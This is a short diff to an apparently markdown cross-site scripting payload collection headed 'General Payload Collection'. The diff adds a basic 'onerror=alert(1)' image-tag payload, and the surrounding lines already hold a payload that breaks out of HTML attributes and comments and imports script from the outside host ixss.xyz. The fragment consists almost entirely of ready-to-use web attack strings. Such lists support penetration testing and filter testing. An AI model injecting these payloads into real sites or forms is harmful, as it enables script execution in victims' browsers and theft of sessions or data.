@@ -1,5 +1,8 @@
 ## General Payload Collection:
 ```bash
+"><img src=x onerror=alert(1)>
+```
+```bash
 -->';"><img src=x onerror=import('//ixss.xyz')>//
 ```
 ```bash
